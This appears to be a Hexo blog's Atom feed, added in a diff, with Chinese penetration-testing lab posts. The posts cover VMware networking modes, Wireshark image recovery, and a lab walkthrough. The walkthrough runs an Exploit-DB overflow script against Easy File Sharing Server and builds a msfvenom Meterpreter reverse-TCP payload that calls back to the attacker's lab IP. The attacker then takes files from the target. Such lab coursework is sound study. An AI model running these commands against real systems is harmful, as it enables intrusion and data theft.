@@ -1,0 +1,104 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+  <title>空白boos</title>
+  
+  
+  <link href="http://boos309.top/atom.xml" rel="self"/>
+  
+  <link href="http://boos309.top/"/>
+  <updated>2022-11-23T14:37:45.250Z</updated>
+  <id>http://boos309.top/</id>
+  
+  <author>
+    <name>Boos</name>
+    
+  </author>
+  
+  <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Zoomeye相关</title>
+    <link href="http://boos309.top/post/33d3e3bd.html"/>
+    <id>http://boos309.top/post/33d3e3bd.html</id>
+    <published>2022-11-23T14:14:46.000Z</published>
+    <updated>2022-11-23T14:37:45.250Z</updated>
+    
+    
+    
+    
+    
+    <category term="网络渗透测试" scheme="http://boos309.top/tags/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>复现任务A</title>
+    <link href="http://boos309.top/post/8d296d10.html"/>
+    <id>http://boos309.top/post/8d296d10.html</id>
+    <published>2022-11-23T14:01:58.000Z</published>
+    <updated>2022-11-23T14:13:33.616Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="一、漏洞渗透测试"><a href="#一、漏洞渗透测试" class="headerlink" title="一、漏洞渗透测试"></a><strong>一、漏洞渗透测试</strong></h3><h4 id="1、靶机-Windows-安装easy-file-sharing-server，该服务存在漏洞"><a href="#1、靶机-Windows-安装easy-file-sharing-server，该服务存在漏洞" class="headerlink" title="1、靶机(Windows)安装easy file sharing server，该服务存在漏洞"></a><strong>1、靶机(Windows)安装easy file sharing server，该服务存在漏洞</strong></h4><p>在靶机上安装并运行该服务<img src="/../images/$%7Bfiilename%7D/image-20221123221112895.png" alt="image-20221123221112895"></p><h4 id="2、利用Nmap扫描发现靶机-Windows-运行了该服务。"><a href="#2、利用Nmap扫描发现靶机-Windows-运行了该服务。" class="headerlink" title="2、利用Nmap扫描发现靶机(Windows)运行了该服务。"></a><strong>2、利用Nmap扫描发现靶机(Windows)运行了该服务。</strong></h4><p>首先用命令：ifconfig 得到kali主机的ip：192.168.30.131；</p><p>然后用命令：fping -g 192.168.30.131&#x2F;24 扫描局域网内存活的其他主机；</p><p><img src="/../images/$%7Bfiilename%7D/image-20221123221135728.png" alt="image-20221123221135728"></p><p>由此可知，我们的靶机的ip地址为192.168.30.133；</p><p>使用命令：nmap -sV 192.168.30.133 扫描靶机上开启的服务</p><p><img src="/../images/$%7Bfiilename%7D/image-20221123221147418.png" alt="image-20221123221147418"></p><p>可以看到，easy file sharing server 服务已经被发现</p><h3 id="3、利用该漏洞，使得靶机运行计算器。"><a href="#3、利用该漏洞，使得靶机运行计算器。" class="headerlink" title="3、利用该漏洞，使得靶机运行计算器。"></a><strong>3、利用该漏洞，使得靶机运行计算器。</strong></h3><p>使用命令：searchsploit easy file sharing 在Kali Linux 2中查找需要的渗透模块，</p><p>找到其远程溢出漏洞渗透模块的脚本对应所在的位置为&#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;windows&#x2F;remote&#x2F;39009.py</p><p><img src="/../images/$%7Bfiilename%7D/image-20221123221158271.png" alt="image-20221123221158271"></p><p>使用命令：python2 &#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;windows&#x2F;remote&#x2F;39009.py 192.168.30.133 80 运行脚本</p><p><img src="/../images/$%7Bfiilename%7D/image-20221123221208660.png" alt="image-20221123221208660"></p><p>然后返回靶机可以看到，靶机上的计算器已经被打开了</p><p><img src="/../images/$%7Bfiilename%7D/image-20221123221223037.png" alt="image-20221123221223037"></p><h3 id="二、Metasploit应用"><a href="#二、Metasploit应用" class="headerlink" title="二、Metasploit应用"></a><strong>二、Metasploit应用</strong></h3><h4 id="1、生成主控端、被控端。"><a href="#1、生成主控端、被控端。" class="headerlink" title="1、生成主控端、被控端。"></a><strong>1、生成主控端、被控端。</strong></h4><p>使用命令：msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;192.168.30.131 lport&#x3D;5000 -f exe -o &#x2F;root&#x2F;payload.exe在kali的root目录下生成被控端payload.exe</p><p><img src="/../images/$%7Bfiilename%7D/image-20221123221234895.png" alt="image-20221123221234895"></p><p>使用命令：msfconsole 在kali启动主动端启动Metasploit，然后使用命令：use exploit&#x2F;multi&#x2F;handler启动handler,</p><p>再使用命令：set payload windows&#x2F;meterpreter&#x2F;revese_tcp设置payload为windows&#x2F;meterpreter&#x2F;revese_tcp ，再用命令：set lhost 192.168.30.131 和 set lport 5000 设置lhost和lport（可以使用 show options查看是否更改成功）</p><p><img src="/../images/$%7Bfiilename%7D/image-20221123221246049.png" alt="image-20221123221246049"></p><h4 id="2、获得靶机-Windows-控制权。"><a href="#2、获得靶机-Windows-控制权。" class="headerlink" title="2、获得靶机(Windows)控制权。"></a><strong>2、获得靶机(Windows)控制权。</strong></h4><p>在kali使用命令：exploit，然后将payload.exe复制到靶机上并运行</p><p>然后会发现kali的主控端打开了一个控制会话session</p><p><img src="/../images/$%7Bfiilename%7D/image-20221123221301757.png" alt="image-20221123221301757"></p><p>此时已经取得了靶机win7的控制权</p><h4 id="3、下载靶机上任意一个文件。"><a href="#3、下载靶机上任意一个文件。" class="headerlink" title="3、下载靶机上任意一个文件。"></a><strong>3、下载靶机上任意一个文件。</strong></h4><p>使用命令：pwd 就可以查看当前命令操作的目录</p><p><img src="/../images/$%7Bfiilename%7D/image-20221123221308946.png" alt="image-20221123221308946"></p><p>使用命令：pwd 查看当前目录的文件</p><p><img src="/../images/$%7Bfiilename%7D/image-20221123221314534.png" alt="image-20221123221314534"></p><p>使用命令：download +文件名 即可下载对应文件</p><p><img src="/../images/$%7Bfiilename%7D/image-20221123221319463.png" alt="image-20221123221319463"></p><p>在kali的root目录即可找到对应文件</p><p><img src="/../images/$%7Bfiilename%7D/image-20221123221324397.png" alt="image-20221123221324397"></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h3 id=&quot;一、漏洞渗透测试&quot;&gt;&lt;a href=&quot;#一、漏洞渗透测试&quot; class=&quot;headerlink&quot; title=&quot;一、漏洞渗透测试&quot;&gt;&lt;/a&gt;&lt;strong&gt;一、漏洞渗透测试&lt;/strong&gt;&lt;/h3&gt;&lt;h4 id=&quot;1、靶机-Windows-安装easy-file</summary>
+      
+    
+    
+    
+    
+    <category term="网络渗透测试" scheme="http://boos309.top/tags/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>以桥接、NAT模式设置Kali虚拟机</title>
+    <link href="http://boos309.top/post/9e0af484.html"/>
+    <id>http://boos309.top/post/9e0af484.html</id>
+    <published>2022-11-23T13:07:48.000Z</published>
+    <updated>2022-11-23T13:56:07.174Z</updated>
+    
+    <content type="html"><![CDATA[<hr><h3 id="1-桥接模式"><a href="#1-桥接模式" class="headerlink" title="1.桥接模式"></a>1.桥接模式</h3><p>VMware桥接模式，也就是将虚拟机的虚拟网络适配器与主机的物理网络适配器进行交接，虚拟机中的虚拟网络适配器可通过主机中的物理网络适配器直接访问到外部网络(例如图中所示的局域网和Internet，下同)。简而言之，这就好像在上图所示的局域网中添加了一台新的、独立的计算机一样。因此，虚拟机也会占用局域网中的一个IP地址，并且可以和其他终端进行相互访问。桥接模式网络连接支持有线和无线主机网络适配器。如果你想把虚拟机当做一台完全独立的计算机看待，并且允许它和其他终端一样的进行网络通信，那么桥接模式通常是虚拟机访问网络的最简单途径。</p><hr><h3 id="2-NAT模式"><a href="#2-NAT模式" class="headerlink" title="2.NAT模式"></a>2.NAT模式</h3><p>NAT，是Network Address Translation的缩写，意即网络地址转换。NAT模式也是VMware创建虚拟机的默认网络连接模式。使用NAT模式网络连接时，VMware会在主机上建立单独的专用网络，用以在主机和虚拟机之间相互通信。虚拟机向外部网络发送的请求数据”包裹”，都会交由NAT网络适配器加上”特殊标记”并以主机的名义转发出去，外部网络返回的响应数据”包裹”，也是先由主机接收，然后交由NAT网络适配器根据”特殊标记”进行识别并转发给对应的虚拟机，因此，虚拟机在外部网络中不必具有自己的IP地址。从外部网络来看，虚拟机和主机在共享一个IP地址，默认情况下，外部网络终端也无法访问到虚拟机。</p><hr><h3 id="3-不同模式下物理机、Kali虚拟机IP地址的关系"><a href="#3-不同模式下物理机、Kali虚拟机IP地址的关系" class="headerlink" title="3.不同模式下物理机、Kali虚拟机IP地址的关系"></a>3.不同模式下物理机、Kali虚拟机IP地址的关系</h3><p>物理机打开cmd输入命令：ipconfig ，得到物理机的ip地址：192.168.8.203</p><p><img src="/../images/$%7Bfiilename%7D/cmd_K4fDbcr1dy.png" alt="cmd_K4fDbcr1dy"></p><h4 id="桥接模式："><a href="#桥接模式：" class="headerlink" title="桥接模式："></a>桥接模式：</h4><p>将kali虚拟机的网络配置切换成桥接模式</p><p><img src="/../images/$%7Bfiilename%7D/vmware_mBdVZlC1bS-1669210354533-7.png" alt="vmware_mBdVZlC1bS"></p><p>然后在kali里面输入命令：ifconfig 查看kali的ip地址：192.168.8.78</p><p><img src="/../images/$%7Bfiilename%7D/vmware_Ac0qGFr1bT.png" alt="vmware_Ac0qGFr1bT"></p><p>将其分别和子网掩码进行与运算发现，物理机ip和其子网掩码相与的结果为：192.168.8.0，kali的ip和其 子网掩码相与的结果也为：192.168.8.0</p><p>由此可知，物理机和kali虚拟机在同一个子网</p><h5 id="关系：在同一个子网"><a href="#关系：在同一个子网" class="headerlink" title="关系：在同一个子网"></a>关系：在同一个子网</h5><hr><h4 id="NAT模式："><a href="#NAT模式：" class="headerlink" title="NAT模式："></a>NAT模式：</h4><p>将kali的网络配置改为NAT模式</p><p><img src="/../images/$%7Bfiilename%7D/vmware_f7WKNhrVUz-1669210855723-10.png" alt="vmware_f7WKNhrVUz"></p><p>然后在kali里面输入命令：ifconfig 查看kali的ip地址，发现kali的ip地址变成了：192.168.30.131</p><p><img src="/../images/$%7Bfiilename%7D/vmware_fTHCP30o4e.png" alt="vmware_fTHCP30o4e"></p><p>再次将kali的ip地址和子网掩码进行相与运算，结果为：192.168.30.0，和物理机的结果：192.168.8.0不相同</p><p>由此可知，物理机和kali虚拟机在不同一个子网</p><h5 id="关系：不在同一个子网"><a href="#关系：不在同一个子网" class="headerlink" title="关系：不在同一个子网"></a>关系：不在同一个子网</h5>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;hr&gt;
+&lt;h3 id=&quot;1-桥接模式&quot;&gt;&lt;a href=&quot;#1-桥接模式&quot; class=&quot;headerlink&quot; title=&quot;1.桥接模式&quot;&gt;&lt;/a&gt;1.桥接模式&lt;/h3&gt;&lt;p&gt;VMware桥接模式，也就是将虚拟机的虚拟网络适配器与主机的物理网络适配器进行交接，虚拟机中的虚拟</summary>
+      
+    
+    
+    
+    
+    <category term="网络渗透测试" scheme="http://boos309.top/tags/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>WireShark图片还原</title>
+    <link href="http://boos309.top/post/9a74cf7b.html"/>
+    <id>http://boos309.top/post/9a74cf7b.html</id>
+    <published>2022-11-23T13:03:51.000Z</published>
+    <updated>2022-11-23T13:04:35.597Z</updated>
+    
+    <content type="html"><![CDATA[<hr><p>准备工具：WireShark、QQ</p><hr><h4 id="1-打开WireShark，选择WLAN，并进行抓包"><a href="#1-打开WireShark，选择WLAN，并进行抓包" class="headerlink" title="1.打开WireShark，选择WLAN，并进行抓包"></a>1.打开WireShark，选择WLAN，并进行抓包</h4><p><img src="/../images/$%7Bfiilename%7D/Wireshark_NQChU6EX2h.png" alt="Wireshark_NQChU6EX2h"></p><hr><h4 id="2-手机和电脑同时登录同一个QQ，使用手机QQ发送一张图片给电脑"><a href="#2-手机和电脑同时登录同一个QQ，使用手机QQ发送一张图片给电脑" class="headerlink" title="2.手机和电脑同时登录同一个QQ，使用手机QQ发送一张图片给电脑"></a>2.手机和电脑同时登录同一个QQ，使用手机QQ发送一张图片给电脑</h4><p>图片如下：</p><p>![屏幕截图 2022-10-09 093949(1)(1)](..&#x2F;images&#x2F;${fiilename}&#x2F;屏幕截图 2022-10-09 093949(1)(1).png)</p><hr><h4 id="3-查看手机和电脑的ip和http，将其作为过滤条件"><a href="#3-查看手机和电脑的ip和http，将其作为过滤条件" class="headerlink" title="3.查看手机和电脑的ip和http，将其作为过滤条件"></a>3.查看手机和电脑的ip和http，将其作为过滤条件</h4><p><img src="/../images/$%7Bfiilename%7D/Wireshark_2R0HpIIUGx.png" alt="Wireshark_2R0HpIIUGx"></p><hr><h4 id="4-找到info里有PNG的数据"><a href="#4-找到info里有PNG的数据" class="headerlink" title="4.找到info里有PNG的数据"></a>4.找到info里有PNG的数据</h4><p><img src="/../images/$%7Bfiilename%7D/Wireshark_NXXMiVF6gV.png" alt="Wireshark_NXXMiVF6gV"></p><hr><h4 id="5-对其右键选择追踪流-TCP流，将ASCII码改成原始数据"><a href="#5-对其右键选择追踪流-TCP流，将ASCII码改成原始数据" class="headerlink" title="5.对其右键选择追踪流-TCP流，将ASCII码改成原始数据"></a>5.对其右键选择追踪流-TCP流，将ASCII码改成原始数据</h4><p><img src="/../images/$%7Bfiilename%7D/y1UcF6Wpz8.png" alt="y1UcF6Wpz8"></p><p><img src="/../images/$%7Bfiilename%7D/Wireshark_9jmMy0yjl1.png" alt="Wireshark_9jmMy0yjl1"></p><hr><h4 id="6-然后将其另存为png文件"><a href="#6-然后将其另存为png文件" class="headerlink" title="6.然后将其另存为png文件"></a>6.然后将其另存为png文件</h4><p><img src="/../images/$%7Bfiilename%7D/Wireshark_XzxUK2JiNF.png" alt="Wireshark_XzxUK2JiNF"></p><hr><h4 id="7-发现图片无法打开"><a href="#7-发现图片无法打开" class="headerlink" title="7.发现图片无法打开"></a>7.发现图片无法打开</h4><p><img src="/../images/$%7Bfiilename%7D/ApplicationFrameHost_cyNNuIykzP.png" alt="ApplicationFrameHost_cyNNuIykzP"></p><hr><h4 id="8-使用WInHex打开图片"><a href="#8-使用WInHex打开图片" class="headerlink" title="8.使用WInHex打开图片"></a>8.使用WInHex打开图片</h4><p>找到89504E47，这个是PNG的文件头</p><p>.<img src="/../images/$%7Bfiilename%7D/image-20221122174724651.png" alt="image-20221122174724651"></p><p>将其前面的数据全选删除，并保存</p><p><img src="/../images/$%7Bfiilename%7D/WinHex_oywsbTV4aH.png" alt="WinHex_oywsbTV4aH"></p><hr><h4 id="9-再次打开图片，发现可以正常打开"><a href="#9-再次打开图片，发现可以正常打开" class="headerlink" title="9.再次打开图片，发现可以正常打开"></a>9.再次打开图片，发现可以正常打开</h4><p><img src="/../images/$%7Bfiilename%7D/ApplicationFrameHost_JphUwnXRLY.png" alt="ApplicationFrameHost_JphUwnXRLY"></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;hr&gt;
+&lt;p&gt;准备工具：WireShark、QQ&lt;/p&gt;
+&lt;hr&gt;
+&lt;h4 id=&quot;1-打开WireShark，选择WLAN，并进行抓包&quot;&gt;&lt;a href=&quot;#1-打开WireShark，选择WLAN，并进行抓包&quot; class=&quot;headerlink&quot; title=&quot;1.打开W</summary>
+      
+    
+    
+    
+    
+    <category term="网络渗透测试" scheme="http://boos309.top/tags/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
+    
+  </entry>
+  
+</feed>
